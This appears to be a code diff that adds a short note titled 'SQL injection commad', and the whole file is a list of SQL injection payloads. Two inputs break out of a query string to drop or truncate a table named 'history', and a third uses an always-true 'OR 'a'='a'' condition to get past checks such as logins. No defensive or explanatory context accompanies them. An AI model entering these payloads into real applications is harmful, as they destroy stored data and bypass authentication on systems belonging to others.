@@ -1,0 +1,7 @@
+---------------------------------
+SQL injection commad
+
+'; DROP TABLE history; --
+'; TRUNCATE TABLE history; --
+' OR 'a'='a'; -- 
+---------------------------------
